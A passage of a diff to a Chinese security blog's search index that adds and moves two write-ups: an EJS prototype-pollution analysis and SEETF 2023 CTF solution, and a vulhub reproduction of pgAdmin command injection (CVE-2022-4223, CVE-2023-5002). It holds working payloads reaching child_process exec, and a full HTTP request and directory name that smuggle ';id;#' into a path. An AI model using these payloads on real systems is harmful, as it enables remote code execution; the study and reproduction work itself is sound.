-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.createNullProtoObjWherePossible = (function () &#123;</span><br><span class="line">    if (typeof Object.create == &#x27;function&#x27;) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return Object.create(null);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(&#123;__proto__: null&#125; instanceof Object)) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return &#123;__proto__: null&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Not possible, just pass through</span><br><span class="line">    return function () &#123;</span><br><span class="line">        return &#123;&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>参考文章是这么说的，分析上述代码，可以知道不能滥用原型链污染库内新创建的对象。因此，对于用户提供的对象来说情况并非如此，从 EJS 维护者的角度来看，用户向库提供的输入不是 EJS 的责任。</p>
-</blockquote>
-<p>如何理解呢，就是说我们提供的可以被污染的对象并不会遭到上述函数清理。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>渲染模板时ejs 动态创建函数，该函数将使用<strong>传递给它的数据</strong>组装模板。该函数是根据模板动态创建的字符串编译的。所有这些都发生在最终被调用的 Template 类的编译函数中，在这种情况下，当创建模板对象时，将使用受感染的选项。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.compile = function compile(template, opts) &#123;</span><br><span class="line">    var templ;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    templ = new Template(template, opts);</span><br><span class="line">    return templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>现在我们知道可以控制配置对象的原型后，那么就可以进一步利用</p>
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106161658664.png"></p>
-<p>我们已经知道当编译模板时，它会使用多个配置元素来处理模板中的代码片段，并将其转换为可执行的 JavaScript 函数。这些配置元素可能包括模板标签、控制流语句、输出语句等。不过其中大多数都使用<code>_JS_IDENTIFIER</code> 正则表达式进行清理</p>
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106162305462.png"></p>
-<p>但是并不意味着所有都会被正则清理，我们看向下面代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compile: function () &#123;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var src;</span><br><span class="line">    /** @type &#123;ClientFunction&#125; */</span><br><span class="line">    var fn;</span><br><span class="line">    var opts = this.opts;</span><br><span class="line">    var prepended = &#x27;&#x27;;</span><br><span class="line">    var appended = &#x27;&#x27;;</span><br><span class="line">    /** @type &#123;EscapeCallback&#125; */</span><br><span class="line">    var escapeFn = opts.escapeFunction;</span><br><span class="line">    /** @type &#123;FunctionConstructor&#125; */</span><br><span class="line">    var ctor;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : &#x27;undefined&#x27;;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (opts.client) &#123;</span><br><span class="line">      src = &#x27;escapeFn = escapeFn || &#x27; + escapeFn.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      if (opts.compileDebug) &#123;</span><br><span class="line">        src = &#x27;rethrow = rethrow || &#x27; + rethrow.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return returnedFn;</span><br></pre></td></tr></table></figure>
-
-<p>我们可以知道将<code>opts.escapeFunction</code>赋值给<code>escapeFn</code>，如果<code>opts.client</code>存在，那么<code>escapeFn</code>就会在函数体内从而被调用</p>
-<p>由于 opts.client 和 opts.escapeFunction 默认情况下未设置，因此可以原型链污染它们到达eval接收器并实现RCE</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__proto__&quot;: &#123;</span><br><span class="line">        &quot;client&quot;: 1,</span><br><span class="line">        &quot;escapeFunction&quot;: &quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Setup app</span><br><span class="line">const express = require(&quot;express&quot;);</span><br><span class="line">const app  = express();</span><br><span class="line">const port = 3000;</span><br><span class="line"></span><br><span class="line">// Select ejs templating library</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">// Routes</span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&quot;index&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/vuln&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    // simulate SSPP vulnerability</span><br><span class="line">    var a = req.query.a;</span><br><span class="line">    var b = req.query.b;</span><br><span class="line">    var c = req.query.c;</span><br><span class="line"></span><br><span class="line">    var obj = &#123;&#125;;</span><br><span class="line">    obj[a][b] = c;</span><br><span class="line"></span><br><span class="line">    res.send(&quot;OK!&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Start app</span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`App listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>GET传参payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次: /vuln?a=__proto__&amp;b=escapeFunction&amp;c=JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br><span class="line">第二次: /vuln?a=__proto__&amp;b=client&amp;c=true</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106163117582.png"></p>
-<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p><strong>[SEETF 2023]Express JavaScript Security</strong></p>
-<p>源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const BLACKLIST = [</span><br><span class="line">    &quot;outputFunctionName&quot;,</span><br><span class="line">    &quot;escapeFunction&quot;,</span><br><span class="line">    &quot;localsName&quot;,</span><br><span class="line">    &quot;destructuredLocals&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    return res.render(&#x27;index&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/greet&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    const data = JSON.stringify(req.query);</span><br><span class="line"></span><br><span class="line">    if (BLACKLIST.find((item) =&gt; data.includes(item))) &#123;</span><br><span class="line">        return res.status(400).send(&#x27;Can you not?&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res.render(&#x27;greet&#x27;, &#123;</span><br><span class="line">        ...JSON.parse(data),</span><br><span class="line">        cache: false</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Server listening on port 3000&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>分析一下，<code>app.set(&#39;view engine&#39;, &#39;ejs&#39;);</code>说明ejs模板是默认配置，在<code>/greet</code>路由下，接收GET参数并赋值给data变量，然后黑名单检测，调用ejs模板进行渲染其中解析data的json数据，说明ejs配置可控。</p>
-<p>我们前文利用的payload是有escapeFunction关键字的，并且污染的过程是我们手动添加<code>/vuln</code>上去的，所以我们要寻找可以利用的地方</p>
-<p>通常情况下，ejs模板只允许在数据对象中传递以下相对无害的选项</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _OPTS_PASSABLE_WITH_DATA = [&#x27;delimiter&#x27;, &#x27;scope&#x27;, &#x27;context&#x27;, &#x27;debug&#x27;, &#x27;compileDebug&#x27;,</span><br><span class="line">  &#x27;client&#x27;, &#x27;_with&#x27;, &#x27;rmWhitespace&#x27;, &#x27;strict&#x27;, &#x27;filename&#x27;, &#x27;async&#x27;];</span><br><span class="line">// We don&#x27;t allow &#x27;cache&#x27; option to be passed in the data obj for</span><br><span class="line">// the normal `render` call, but this is where Express 2 &amp; 3 put it</span><br><span class="line">// so we make an exception for `renderFile`</span><br><span class="line">var _OPTS_PASSABLE_WITH_DATA_EXPRESS = _OPTS_PASSABLE_WITH_DATA.concat(&#x27;cache&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>但是我们找到<code>settings[&#39;view options&#39;]</code>可用于将任意选项传递给EJS，这将是我们利用的点</p>
-<p>跟进一下，会调用shallowCopy()进行赋值给opts</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">viewOpts = data.settings[&#x27;view options&#x27;];</span><br><span class="line">if (viewOpts) &#123;</span><br><span class="line">  utils.shallowCopy(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>而在渲染模板的时候会跟进到Template类中，发现关键语句</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br></pre></td></tr></table></figure>
-
-<p>也就是说虽然escapeFunction被过滤了，但是我们可以利用opts.escape去替换</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">settings[&#x27;view options&#x27;][escape]=...</span><br></pre></td></tr></table></figure>
-
-<p>将前文漏洞利用的payload稍加修改一下，然后添加上greet.ejs中的三个配置参数</p>
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106171750370.png"></p>
-<p>得到最终payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/greet?name=test&amp;font=test&amp;fontSize=test&amp;settings[view options][escape]=function()&#123;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;)&#125;&amp;settings[view options][client]=1</span><br></pre></td></tr></table></figure>
-
-<p>注：题目源码已经<code>JSON.stringify</code>了，<code>/readflag</code>可以在dockerfile中得到信息</p>
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106175700268.png"></p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>模板注入</tag>
-        <tag>原型链污染</tag>
       </tags>
   </entry>
   <entry>
@@ -2204,6 +2228,63 @@
       </tags>
   </entry>
   <entry>
+    <title>pgAdmin命令执行漏洞</title>
+    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
+<span id="more"></span>
+
+<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
+</blockquote>
+<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
+<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
+<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
+<p>在本地搭建环境，访问5050端口是登录界面</p>
+<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
+<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
+
+<p>成功命令执行，返回包如下</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
+<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
+<ul>
+<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
+<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
+</ul>
+<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
+<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
+<ul>
+<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
+<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
+</ul>
+<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
+<p>Windows下返回结果为True</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
+<p>而Linux下返回结果为False</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
+<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
+<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
+<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
+<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
+<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
+<p>成功命令执行</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+  </entry>
+  <entry>
     <title>信息搜集</title>
     <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
     <content><![CDATA[<p>渗透测试的信息搜集</p>
@@ -2291,85 +2372,79 @@
       </categories>
   </entry>
   <entry>
-    <title>pgAdmin命令执行漏洞</title>
-    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
+    <title>ejs默认配置之原型链污染</title>
+    <url>/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</url>
+    <content><![CDATA[<p>ejs默认配置造成原型链污染</p>
 <span id="more"></span>
 
-<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
+<h1 id="ejs默认配置之原型链污染"><a href="#ejs默认配置之原型链污染" class="headerlink" title="ejs默认配置之原型链污染"></a>ejs默认配置之原型链污染</h1><p><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce#sspp_gadget">参考文章</a></p>
+<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>EJS维护者对原型链污染的问题有着很好的理解，并使用非常安全的函数清理他们创建的每个对象</p>
+<p>利用<code>Render()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.render = function (template, d, o) &#123;</span><br><span class="line">    var data = d || utils.createNullProtoObjWherePossible();</span><br><span class="line">    var opts = o || utils.createNullProtoObjWherePossible();</span><br><span class="line"></span><br><span class="line">    // No options object -- if there are optiony names</span><br><span class="line">    // in the data, copy them to options</span><br><span class="line">    if (arguments.length == 2) &#123;</span><br><span class="line">        utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return handleCache(opts, template)(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>以及<code>createNullProtoObjWherePossible()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.createNullProtoObjWherePossible = (function () &#123;</span><br><span class="line">    if (typeof Object.create == &#x27;function&#x27;) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return Object.create(null);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(&#123;__proto__: null&#125; instanceof Object)) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return &#123;__proto__: null&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Not possible, just pass through</span><br><span class="line">    return function () &#123;</span><br><span class="line">        return &#123;&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考文章是这么说的，分析上述代码，可以知道不能滥用原型链污染库内新创建的对象。因此，对于用户提供的对象来说情况并非如此，从 EJS 维护者的角度来看，用户向库提供的输入不是 EJS 的责任。</p>
 </blockquote>
-<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
-<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
-<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
-<p>在本地搭建环境，访问5050端口是登录界面</p>
-<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
-<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>如何理解呢，就是说我们提供的可以被污染的对象并不会遭到上述函数清理。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>渲染模板时ejs 动态创建函数，该函数将使用<strong>传递给它的数据</strong>组装模板。该函数是根据模板动态创建的字符串编译的。所有这些都发生在最终被调用的 Template 类的编译函数中，在这种情况下，当创建模板对象时，将使用受感染的选项。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.compile = function compile(template, opts) &#123;</span><br><span class="line">    var templ;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    templ = new Template(template, opts);</span><br><span class="line">    return templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
+<p>现在我们知道可以控制配置对象的原型后，那么就可以进一步利用</p>
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106161658664.png"></p>
+<p>我们已经知道当编译模板时，它会使用多个配置元素来处理模板中的代码片段，并将其转换为可执行的 JavaScript 函数。这些配置元素可能包括模板标签、控制流语句、输出语句等。不过其中大多数都使用<code>_JS_IDENTIFIER</code> 正则表达式进行清理</p>
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106162305462.png"></p>
+<p>但是并不意味着所有都会被正则清理，我们看向下面代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compile: function () &#123;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var src;</span><br><span class="line">    /** @type &#123;ClientFunction&#125; */</span><br><span class="line">    var fn;</span><br><span class="line">    var opts = this.opts;</span><br><span class="line">    var prepended = &#x27;&#x27;;</span><br><span class="line">    var appended = &#x27;&#x27;;</span><br><span class="line">    /** @type &#123;EscapeCallback&#125; */</span><br><span class="line">    var escapeFn = opts.escapeFunction;</span><br><span class="line">    /** @type &#123;FunctionConstructor&#125; */</span><br><span class="line">    var ctor;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : &#x27;undefined&#x27;;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (opts.client) &#123;</span><br><span class="line">      src = &#x27;escapeFn = escapeFn || &#x27; + escapeFn.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      if (opts.compileDebug) &#123;</span><br><span class="line">        src = &#x27;rethrow = rethrow || &#x27; + rethrow.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return returnedFn;</span><br></pre></td></tr></table></figure>
 
-<p>成功命令执行，返回包如下</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
-<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
-<ul>
-<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
-<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
-</ul>
